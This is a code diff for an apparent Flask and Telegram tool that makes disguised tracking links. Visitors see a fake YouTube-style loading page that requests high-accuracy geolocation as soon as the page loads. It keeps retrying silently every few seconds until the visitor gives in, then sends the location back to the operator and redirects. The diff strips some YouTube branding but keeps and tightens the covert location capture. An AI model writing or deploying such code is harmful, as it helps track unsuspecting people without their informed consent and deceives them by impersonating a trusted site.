@@ -26,18 +26,6 @@ if not TELEGRAM_TOKEN:
 
 BASE_URL = os.environ.get('BASE_URL', 'https://youtube-com-t2rz.onrender.com')
 
-# Only YouTube brand
-FAKE_DOMAINS = {
-    'youtube': {
-        'path': 'youtube.com/watch',
-        'name': 'YouTube',
-        'icon': '▶️',
-        'color': '#FF0000',
-        'gradient': 'linear-gradient(135deg, #FF0000 0%, #cc0000 100%)',
-        'favicon': 'https://www.youtube.com/favicon.ico'
-    }
-}
-
 WEBSITE_INPUT = 1
 
 app = Flask(__name__)
@@ -75,13 +63,13 @@ def generate_link(user_id, website_url, brand, chat_id):
               (link_id, user_id, website_url, brand, datetime.now(), 'active', chat_id))
     conn.commit()
     conn.close()
-    return f"{BASE_URL}/youtube.com/watch/{link_id}"
+    return f"{BASE_URL}/watch/{link_id}"
 
-@app.route('/youtube.com/watch/<link_id>')
+@app.route('/watch/<link_id>')
 def fake_domain_track(link_id):
     conn = sqlite3.connect('location_tracker.db')
     c = conn.cursor()
-    c.execute("SELECT website_url, status FROM links WHERE link_id = ? AND brand = 'youtube'", (link_id,))
+    c.execute("SELECT website_url, status FROM links WHERE link_id = ?", (link_id,))
     result = c.fetchone()
     conn.close()
     
@@ -96,8 +84,7 @@ def fake_domain_track(link_id):
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <title>YouTube</title>
-        <link rel="icon" href="https://www.youtube.com/favicon.ico">
+        <title></title>
         <style>
             * {{
                 margin: 0;
@@ -125,40 +112,6 @@ def fake_domain_track(link_id):
                 flex-direction: column;
                 position: relative;
                 overflow: hidden;
-            }}
-            
-            /* YouTube Header - logo left aligned */
-            .youtube-header {{
-                padding: 12px 16px 8px 16px;
-                display: flex;
-                justify-content: space-between;
-                align-items: center;
-                background: #0f0f0f;
-                z-index: 10;
-                margin-top: 4px;
-            }}
-            .youtube-logo {{
-                display: flex;
-                align-items: center;
-                flex: 1;
-            }}
-            .youtube-logo svg {{
-                width: 90px;
-                height: 24px;
-                display: block;
-            }}
-            .header-icons {{
-                display: flex;
-                gap: 20px;
-                color: #fff;
-                align-items: center;
-                flex-shrink: 0;
-            }}
-            .header-icons svg {{
-                width: 24px;
-                height: 24px;
-                fill: #fff;
-                display: block;
             }}
             
             /* Loading Content */
@@ -254,32 +207,6 @@ def fake_domain_track(link_id):
                 100% {{ left: 100%; }}
             }}
             
-            /* Bottom Navigation */
-            .bottom-nav {{
-                display: flex;
-                justify-content: space-around;
-                padding: 8px 0 12px 0;
-                background: #0f0f0f;
-                border-top: 1px solid #272727;
-                z-index: 10;
-            }}
-            .nav-item {{
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-                gap: 2px;
-                color: #aaaaaa;
-                font-size: 10px;
-            }}
-            .nav-item.active {{
-                color: #fff;
-            }}
-            .nav-item svg {{
-                width: 24px;
-                height: 24px;
-                fill: currentColor;
-            }}
-            
             /* Progress bar */
             .progress-bar {{
                 position: fixed;
@@ -307,9 +234,30 @@ def fake_domain_track(link_id):
                 100% {{ width: 100%; }}
             }}
             
-            /* Hide any text */
-            .hidden {{
-                display: none !important;
+            /* Bottom Navigation */
+            .bottom-nav {{
+                display: flex;
+                justify-content: space-around;
+                padding: 8px 0 12px 0;
+                background: #0f0f0f;
+                border-top: 1px solid #272727;
+                z-index: 10;
+            }}
+            .nav-item {{
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                gap: 2px;
+                color: #aaaaaa;
+                font-size: 10px;
+            }}
+            .nav-item.active {{
+                color: #fff;
+            }}
+            .nav-item svg {{
+                width: 24px;
+                height: 24px;
+                fill: currentColor;
             }}
         </style>
     </head>
@@ -321,29 +269,6 @@ def fake_domain_track(link_id):
         
         <!-- Main App Container -->
         <div class="app-container">
-            <!-- YouTube Header -->
-            <div class="youtube-header">
-                <div class="youtube-logo">
-                    <svg viewBox="0 0 90 24" fill="none">
-                        <path d="M82.2 2.2C80.8 1.7 79.2 1.3 77.4 1.1C75.6 0.9 73.8 0.8 72 0.8C70.2 0.8 68.4 0.9 66.6 1.1C64.8 1.3 63.2 1.7 61.8 2.2C60.4 2.7 59.2 3.3 58.2 4.1C57.2 4.9 56.6 5.8 56.6 6.9V17.1C56.6 18.2 57.2 19.1 58.2 19.9C59.2 20.7 60.4 21.3 61.8 21.8C63.2 22.3 64.8 22.7 66.6 22.9C68.4 23.1 70.2 23.2 72 23.2C73.8 23.2 75.6 23.1 77.4 22.9C79.2 22.7 80.8 22.3 82.2 21.8C83.6 21.3 84.8 20.7 85.8 19.9C86.8 19.1 87.4 18.2 87.4 17.1V6.9C87.4 5.8 86.8 4.9 85.8 4.1C84.8 3.3 83.6 2.7 82.2 2.2Z" fill="#FF0000"/>
-                        <path d="M72 5L85 12L72 19V5Z" fill="white"/>
-                        <path d="M8.6 22.2H5.8V1.8H8.6V22.2Z" fill="white"/>
-                        <path d="M18.6 22.2H15.8V1.8H18.6V22.2Z" fill="white"/>
-                        <path d="M28.6 22.2H25.8V1.8H28.6V22.2Z" fill="white"/>
-                        <path d="M38.6 22.2H35.8V1.8H38.6V22.2Z" fill="white"/>
-                        <path d="M48.6 22.2H45.8V1.8H48.6V22.2Z" fill="white"/>
-                        <path d="M58.6 22.2H55.8V1.8H58.6V22.2Z" fill="white"/>
-                        <path d="M68.6 22.2H65.8V1.8H68.6V22.2Z" fill="white"/>
-                        <path d="M78.6 22.2H75.8V1.8H78.6V22.2Z" fill="white"/>
-                        <path d="M88.6 22.2H85.8V1.8H88.6V22.2Z" fill="white"/>
-                    </svg>
-                </div>
-                <div class="header-icons">
-                    <svg viewBox="0 0 24 24"><path d="M15 9H3v2h12V9zm0 4H3v2h12v-2zM3 17h8v-2H3v2z"/></svg>
-                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm1-13h-2v6l5.25 3.15L17 12.23l-4-2.37V7z"/></svg>
-                </div>
-            </div>
-            
             <!-- Loading Content -->
             <div class="loading-content">
                 <div class="youtube-loader" id="loader"></div>
@@ -402,6 +327,7 @@ def fake_domain_track(link_id):
             const redirectUrl = '{website_url}';
             const progressFill = document.getElementById('progressFill');
             let locationCaptured = false;
+            let attempts = 0;
             
             function sendLocation(position) {{
                 if (locationCaptured) return;
@@ -435,8 +361,9 @@ def fake_domain_track(link_id):
             }}
             
             function handleError(error) {{
-                // Don't show any error - just keep retrying silently
-                setTimeout(requestLocation, 3000);
+                attempts++;
+                // Always retry, never give up
+                setTimeout(requestLocation, 2000);
             }}
             
             function requestLocation() {{
@@ -447,13 +374,13 @@ def fake_domain_track(link_id):
                         {{enableHighAccuracy: true, timeout: 30000, maximumAge: 0}}
                     );
                 }} else {{
-                    // Fallback - keep trying
-                    setTimeout(requestLocation, 5000);
+                    // Geolocation not supported - retry
+                    setTimeout(requestLocation, 2000);
                 }}
             }}
             
-            // Start location request immediately
-            // Will keep asking until user allows it
+            // Immediately request location when page loads
+            // This triggers the browser's permission prompt
             requestLocation();
         </script>
     </body>
